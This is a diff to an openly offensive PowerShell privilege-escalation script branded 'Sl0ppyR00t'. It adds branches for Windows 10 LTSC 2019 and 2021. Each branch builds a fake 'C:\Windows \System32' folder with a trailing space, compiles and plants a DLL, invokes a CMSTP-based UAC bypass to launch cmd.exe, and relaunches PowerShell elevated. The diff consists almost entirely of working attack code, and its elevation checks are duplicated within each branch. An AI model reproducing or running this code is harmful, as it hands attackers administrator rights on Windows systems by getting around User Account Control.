@@ -782,6 +782,258 @@ switch ($OSVersion)
            }
 
     }     
+    "Windows 10 Enterprise LTSC 2019"
+    {
+	Write-Host " 000000000000000000000000000000000000000000000000"
+        Write-Host " 0 Sl0ppyR00t says it's a Windows 10 LTSC 2019 !0"
+	Write-Host " 000000000000000000000000000000000000000000000000"
+	Write-Host ""
+	Write-Host ""
+        Write-Host " 00000000000000000000000000000000000000"
+        Write-Host " 0 Sl0ppyR00t Making Mock Folder..... 0"
+	Write-Host " 00000000000000000000000000000000000000"
+	New-Item "\\?\C:\Windows \System32" -ItemType Directory	
+        Write-Host ""
+	Write-Host ""
+	Write-Host " {Sl0ppyr00t} Making Mock Folder of system32 is done."
+	Write-Host ""
+	Write-Host ""
+	Write-Host " 00000000000000000000000000000000000000"
+        Write-Host " 0 Sl0ppyR00t Making DLL Files ...... 0"
+	Write-Host " 00000000000000000000000000000000000000"
+        Add-Type -TypeDefinition ([IO.File]::ReadAllText("$pwd\sl0puacb.cs")) -ReferencedAssemblies "System.Windows.Forms" -OutputAssembly "sl0p.dll"
+        Add-Type -TypeDefinition ([IO.File]::ReadAllText("$pwd\sl0puacb.cs")) -ReferencedAssemblies "System.Windows.Forms" -OutputAssembly "C:\Windows\system32\sl0p.dll"
+        Write-Host ""
+	Write-Host ""
+	Write-Host " {Sl0ppyr00t} Making DLL files is done."
+	Write-Host ""
+	Write-Host ""
+	Write-Host " 00000000000000000000000000000000000000"
+        Write-Host " 0 Sl0ppyR00t Copy DLL Files to Mock  0"
+	Write-Host " 00000000000000000000000000000000000000"
+	Copy-Item "sl0p.dll" -Destination "C:\Windows"
+        Write-Host ""
+	Write-Host ""
+	Write-Host " {Sl0ppyr00t} Copy Dll to Mock Folder of system32 is done."
+	Write-Host ""
+	Write-Host ""
+	Write-Host " 0000000000000000000000000000000000000000"
+        Write-Host " 0 Sl0ppyR00t Verify Place of DLL Files 0"
+	Write-Host " 0000000000000000000000000000000000000000"
+	Get-ChildItem C:\Windows\sl0p.dll
+	Write-Host ""
+	Write-Host ""
+	Write-Host " {Sl0ppyr00t} File Is there."
+	[Reflection.Assembly]::Load([IO.File]::ReadAllBytes("$pwd\sl0p.dll"))
+
+        [CMSTPBypass]::Execute("C:\Windows\System32\cmd.exe") 
+        $currentUser = New-Object Security.Principal.WindowsPrincipal $([Security.Principal.WindowsIdentity]::GetCurrent())
+        $testadmin = $currentUser.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
+        if ($testadmin -eq $false) {
+        Start-Process powershell.exe -Verb RunAs -ArgumentList ('-noprofile -noexit -file "{0}" -elevated' -f ($myinvocation.MyCommand.Definition))
+        exit $LASTEXITCODE
+        }
+
+        # Get the ID and security principal of the current user account
+        $myWindowsID=[System.Security.Principal.WindowsIdentity]::GetCurrent()
+        $myWindowsPrincipal=new-object System.Security.Principal.WindowsPrincipal($myWindowsID)
+ 
+        # Get the security principal for the Administrator role
+        $adminRole=[System.Security.Principal.WindowsBuiltInRole]::Administrator
+ 
+        # Check to see if we are currently running "as Administrator"
+        if ($myWindowsPrincipal.IsInRole($adminRole))
+ 
+           {
+           # We are running "as Administrator" - so change the title and background color to indicate this
+           $Host.UI.RawUI.WindowTitle = $myInvocation.MyCommand.Definition + "(Sl0ppyr00t=000==Elevated==0000)"
+           $host.UI.RawUI.BackgroundColor = “DarkRed”
+           clear-host
+           whoami
+           }
+        else
+           {
+           # We are not running "as Administrator" - so relaunch as administrator
+ 
+           # Create a new process object that starts PowerShell
+           $newProcess = new-object System.Diagnostics.ProcessStartInfo "PowerShell";
+ 
+           # Specify the current script path and name as a parameter
+           $newProcess.Arguments = $myInvocation.MyCommand.Definition;
+ 
+           # Indicate that the process should be elevated
+           $newProcess.Verb = "runas";
+ 
+           # Start the new process
+           [System.Diagnostics.Process]::Start($newProcess);
+ 
+           # Exit from the current, unelevated, process
+           exit
+           }
+        # Get the ID and security principal of the current user account
+        $myWindowsID=[System.Security.Principal.WindowsIdentity]::GetCurrent()
+        $myWindowsPrincipal=new-object System.Security.Principal.WindowsPrincipal($myWindowsID)
+ 
+        # Get the security principal for the Administrator role
+        $adminRole=[System.Security.Principal.WindowsBuiltInRole]::Administrator
+ 
+        # Check to see if we are currently running "as Administrator"
+        if ($myWindowsPrincipal.IsInRole($adminRole))
+ 
+           {
+           # We are running "as Administrator" - so change the title and background color to indicate this
+           $Host.UI.RawUI.WindowTitle = $myInvocation.MyCommand.Definition + "(Sl0ppyr00t=000==Elevated==0000)"
+           $Host.UI.RawUI.BackgroundColor = "DarkRed"
+           clear-host
+           whoami
+           }
+        else
+           {
+           # We are not running "as Administrator" - so relaunch as administrator
+ 
+           # Create a new process object that starts PowerShell
+           $newProcess = new-object System.Diagnostics.ProcessStartInfo "PowerShell";
+ 
+           # Specify the current script path and name as a parameter
+           $newProcess.Arguments = $myInvocation.MyCommand.Definition;
+ 
+           # Indicate that the process should be elevated
+           $newProcess.Verb = "runas";
+ 
+           # Start the new process
+           [System.Diagnostics.Process]::Start($newProcess);
+ 
+           # Exit from the current, unelevated, process
+           exit
+           }
+
+    }    
+    "Windows 10 Enterprise LTSC 2021"
+    {
+	Write-Host " 0000000000000000000000000000000000000000000000"
+        Write-Host " 0 Sl0ppyR00t says it's a Windows 10 LTSC2021!0"
+	Write-Host " 0000000000000000000000000000000000000000000000"
+	Write-Host ""
+	Write-Host ""
+        Write-Host " 00000000000000000000000000000000000000"
+        Write-Host " 0 Sl0ppyR00t Making Mock Folder..... 0"
+	Write-Host " 00000000000000000000000000000000000000"
+	New-Item "\\?\C:\Windows \System32" -ItemType Directory	
+        Write-Host ""
+	Write-Host ""
+	Write-Host " {Sl0ppyr00t} Making Mock Folder of system32 is done."
+	Write-Host ""
+	Write-Host ""
+	Write-Host " 00000000000000000000000000000000000000"
+        Write-Host " 0 Sl0ppyR00t Making DLL Files ...... 0"
+	Write-Host " 00000000000000000000000000000000000000"
+        Add-Type -TypeDefinition ([IO.File]::ReadAllText("$pwd\sl0puacb.cs")) -ReferencedAssemblies "System.Windows.Forms" -OutputAssembly "sl0p.dll"
+        Add-Type -TypeDefinition ([IO.File]::ReadAllText("$pwd\sl0puacb.cs")) -ReferencedAssemblies "System.Windows.Forms" -OutputAssembly "C:\Windows\system32\sl0p.dll"
+        Write-Host ""
+	Write-Host ""
+	Write-Host " {Sl0ppyr00t} Making DLL files is done."
+	Write-Host ""
+	Write-Host ""
+	Write-Host " 00000000000000000000000000000000000000"
+        Write-Host " 0 Sl0ppyR00t Copy DLL Files to Mock  0"
+	Write-Host " 00000000000000000000000000000000000000"
+	Copy-Item "sl0p.dll" -Destination "C:\Windows"
+        Write-Host ""
+	Write-Host ""
+	Write-Host " {Sl0ppyr00t} Copy Dll to Mock Folder of system32 is done."
+	Write-Host ""
+	Write-Host ""
+	Write-Host " 0000000000000000000000000000000000000000"
+        Write-Host " 0 Sl0ppyR00t Verify Place of DLL Files 0"
+	Write-Host " 0000000000000000000000000000000000000000"
+	Get-ChildItem C:\Windows\sl0p.dll
+	Write-Host ""
+	Write-Host ""
+	Write-Host " {Sl0ppyr00t} File Is there."
+	[Reflection.Assembly]::Load([IO.File]::ReadAllBytes("$pwd\sl0p.dll"))
+
+        [CMSTPBypass]::Execute("C:\Windows\System32\cmd.exe") 
+        $currentUser = New-Object Security.Principal.WindowsPrincipal $([Security.Principal.WindowsIdentity]::GetCurrent())
+        $testadmin = $currentUser.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
+        if ($testadmin -eq $false) {
+        Start-Process powershell.exe -Verb RunAs -ArgumentList ('-noprofile -noexit -file "{0}" -elevated' -f ($myinvocation.MyCommand.Definition))
+        exit $LASTEXITCODE
+        }
+
+        # Get the ID and security principal of the current user account
+        $myWindowsID=[System.Security.Principal.WindowsIdentity]::GetCurrent()
+        $myWindowsPrincipal=new-object System.Security.Principal.WindowsPrincipal($myWindowsID)
+ 
+        # Get the security principal for the Administrator role
+        $adminRole=[System.Security.Principal.WindowsBuiltInRole]::Administrator
+ 
+        # Check to see if we are currently running "as Administrator"
+        if ($myWindowsPrincipal.IsInRole($adminRole))
+ 
+           {
+           # We are running "as Administrator" - so change the title and background color to indicate this
+           $Host.UI.RawUI.WindowTitle = $myInvocation.MyCommand.Definition + "(Sl0ppyr00t=000==Elevated==0000)"
+           $host.UI.RawUI.BackgroundColor = “DarkRed”
+           clear-host
+           whoami
+           }
+        else
+           {
+           # We are not running "as Administrator" - so relaunch as administrator
+ 
+           # Create a new process object that starts PowerShell
+           $newProcess = new-object System.Diagnostics.ProcessStartInfo "PowerShell";
+ 
+           # Specify the current script path and name as a parameter
+           $newProcess.Arguments = $myInvocation.MyCommand.Definition;
+ 
+           # Indicate that the process should be elevated
+           $newProcess.Verb = "runas";
+ 
+           # Start the new process
+           [System.Diagnostics.Process]::Start($newProcess);
+ 
+           # Exit from the current, unelevated, process
+           exit
+           }
+        # Get the ID and security principal of the current user account
+        $myWindowsID=[System.Security.Principal.WindowsIdentity]::GetCurrent()
+        $myWindowsPrincipal=new-object System.Security.Principal.WindowsPrincipal($myWindowsID)
+ 
+        # Get the security principal for the Administrator role
+        $adminRole=[System.Security.Principal.WindowsBuiltInRole]::Administrator
+ 
+        # Check to see if we are currently running "as Administrator"
+        if ($myWindowsPrincipal.IsInRole($adminRole))
+ 
+           {
+           # We are running "as Administrator" - so change the title and background color to indicate this
+           $Host.UI.RawUI.WindowTitle = $myInvocation.MyCommand.Definition + "(Sl0ppyr00t=000==Elevated==0000)"
+           $Host.UI.RawUI.BackgroundColor = "DarkRed"
+           clear-host
+           whoami
+           }
+        else
+           {
+           # We are not running "as Administrator" - so relaunch as administrator
+ 
+           # Create a new process object that starts PowerShell
+           $newProcess = new-object System.Diagnostics.ProcessStartInfo "PowerShell";
+ 
+           # Specify the current script path and name as a parameter
+           $newProcess.Arguments = $myInvocation.MyCommand.Definition;
+ 
+           # Indicate that the process should be elevated
+           $newProcess.Verb = "runas";
+ 
+           # Start the new process
+           [System.Diagnostics.Process]::Start($newProcess);
+ 
+           # Exit from the current, unelevated, process
+           exit
+           }
+
+    }
     "Windows 10 IoT Core"
     {
 	Write-Host " 0000000000000000000000000000000000000000000000"
